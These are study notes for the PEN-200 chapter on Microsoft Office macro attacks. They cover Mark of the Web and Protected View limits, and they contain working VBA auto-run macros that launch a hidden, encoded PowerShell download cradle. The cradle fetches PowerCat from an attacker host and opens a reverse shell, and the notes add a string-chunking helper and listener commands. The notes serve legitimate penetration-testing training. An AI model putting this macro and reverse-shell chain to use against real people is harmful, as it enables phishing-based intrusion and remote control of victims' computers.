# Microsoft Office Macros

> **PEN-200 Chapter 11.** A Word document can embed VBA that invokes Windows Script Host / ActiveX functionality and starts an OS command. The chapter extends this to a PowerShell + PowerCat reverse shell.

## Important delivery constraints

### Mark of the Web / Protected View

Office files delivered from the Internet may receive **Mark of the Web (MOTW)**. A MOTW-tagged document opens in **Protected View**, which disables editing and blocks macros / embedded objects.

Modern Office versions also block Internet-delivered macros more aggressively. Instead of relying only on **Enable Content**, a user may need to explicitly **Unblock** the file from its Windows file properties before the macro can execute.

For exam notes, remember the dependency:

```text
Internet-delivered Office file
        ↓
MOTW
        ↓
Protected View / macro blocking
        ↓
macro will not execute until the protection is removed / file is trusted
```

## Macro-capable formats

PEN-200 uses `.doc` for the demonstration.

```text
.doc   → can persist an embedded macro
.docm  → macro-enabled Word document
.docx  → cannot persist an embedded macro by itself without a containing template
```

Older DDE/OLE client-side techniques are mentioned but are much less reliable on modern systems without significant target modification.

## Minimal command execution macro

VBA can create a Windows Script Host shell object and call its `Run` method:

```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

Use **both `AutoOpen()` and `Document_Open()`** because they cover different Word/document-opening cases.

## Reverse shell flow

PEN-200 replaces the simple `powershell` command with a Base64-encoded PowerShell download cradle that downloads **PowerCat** and starts a reverse shell.

Underlying PowerShell command:

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p 4444 -e powershell
```

Related PowerCat setup: [[StandAloneBoxes/Standalone Linux Box Methodology/Web-attacks-Methods/Command Injection|Command Injection — Powercat reverse shell]]

### VBA 255-character literal-string limit

A long encoded PowerShell command cannot be placed in one VBA string literal. Store it in a variable and concatenate smaller chunks.

PEN-200 uses a small Python helper to split the generated command into chunks:

```python
s = "powershell.exe -nop -w hidden -enc <BASE64_COMMAND>"
n = 50

for i in range(0, len(s), n):
    print('Str = Str + "' + s[i:i+n] + '"')
```

Paste the resulting lines into the macro:

```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    Str = Str + "powershell.exe -nop -w hidden -enc <CHUNK1>"
    Str = Str + "<CHUNK2>"
    Str = Str + "<CHUNK3>"

    CreateObject("Wscript.Shell").Run Str
End Sub
```

Make sure the Base64 command copied into the helper contains **no line breaks**.

## Attacker-side preparation

Serve `powercat.ps1` from the directory containing it and start the listener:

```bash
python3 -m http.server 80
nc -nvlp 4444
```

Successful flow:

```text
victim opens document
        ↓
AutoOpen / Document_Open
        ↓
Wscript.Shell.Run
        ↓
encoded PowerShell command
        ↓
download powercat.ps1
        ↓
PowerCat connects to nc :4444
```

Related: [[Client-Side Attack Workflow]] · [[Windows Library-ms + LNK]]
